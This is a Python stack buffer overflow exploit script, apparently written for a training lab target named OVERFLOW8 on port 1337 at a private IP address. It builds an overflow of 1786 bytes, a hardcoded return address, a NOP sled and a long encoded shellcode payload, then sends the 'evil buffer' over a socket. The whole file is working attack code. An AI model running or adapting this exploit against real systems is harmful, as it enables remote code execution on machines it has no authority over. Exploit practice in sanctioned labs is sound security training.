#!/usr/bin/env python3
import socket

ip = "10.10.39.227"
port = 1337

prefix = "OVERFLOW8 "
offset = 1786
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xda\xd3\xd9\x74\x24\xf4\xba\xbe\x6c\xd3\xec\x5e\x29\xc9"
"\xb1\x52\x83\xc6\x04\x31\x56\x13\x03\xe8\x7f\x31\x19\xe8"
"\x68\x37\xe2\x10\x69\x58\x6a\xf5\x58\x58\x08\x7e\xca\x68"
"\x5a\xd2\xe7\x03\x0e\xc6\x7c\x61\x87\xe9\x35\xcc\xf1\xc4"
"\xc6\x7d\xc1\x47\x45\x7c\x16\xa7\x74\x4f\x6b\xa6\xb1\xb2"
"\x86\xfa\x6a\xb8\x35\xea\x1f\xf4\x85\x81\x6c\x18\x8e\x76"
"\x24\x1b\xbf\x29\x3e\x42\x1f\xc8\x93\xfe\x16\xd2\xf0\x3b"
"\xe0\x69\xc2\xb0\xf3\xbb\x1a\x38\x5f\x82\x92\xcb\xa1\xc3"
"\x15\x34\xd4\x3d\x66\xc9\xef\xfa\x14\x15\x65\x18\xbe\xde"
"\xdd\xc4\x3e\x32\xbb\x8f\x4d\xff\xcf\xd7\x51\xfe\x1c\x6c"
"\x6d\x8b\xa2\xa2\xe7\xcf\x80\x66\xa3\x94\xa9\x3f\x09\x7a"
"\xd5\x5f\xf2\x23\x73\x14\x1f\x37\x0e\x77\x48\xf4\x23\x87"
"\x88\x92\x34\xf4\xba\x3d\xef\x92\xf6\xb6\x29\x65\xf8\xec"
"\x8e\xf9\x07\x0f\xef\xd0\xc3\x5b\xbf\x4a\xe5\xe3\x54\x8a"
"\x0a\x36\xfa\xda\xa4\xe9\xbb\x8a\x04\x5a\x54\xc0\x8a\x85"
"\x44\xeb\x40\xae\xef\x16\x03\xdb\xe9\x0f\xd2\xb3\xf7\x2f"
"\xc5\x1f\x71\xc9\x8f\x8f\xd7\x42\x38\x29\x72\x18\xd9\xb6"
"\xa8\x65\xd9\x3d\x5f\x9a\x94\xb5\x2a\x88\x41\x36\x61\xf2"
"\xc4\x49\x5f\x9a\x8b\xd8\x04\x5a\xc5\xc0\x92\x0d\x82\x37"
"\xeb\xdb\x3e\x61\x45\xf9\xc2\xf7\xae\xb9\x18\xc4\x31\x40"
"\xec\x70\x16\x52\x28\x78\x12\x06\xe4\x2f\xcc\xf0\x42\x86"
"\xbe\xaa\x1c\x75\x69\x3a\xd8\xb5\xaa\x3c\xe5\x93\x5c\xa0"
"\x54\x4a\x19\xdf\x59\x1a\xad\x98\x87\xba\x52\x73\x0c\xda"
"\xb0\x51\x79\x73\x6d\x30\xc0\x1e\x8e\xef\x07\x27\x0d\x05"
"\xf8\xdc\x0d\x6c\xfd\x99\x89\x9d\x8f\xb2\x7f\xa1\x3c\xb2"
"\x55")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
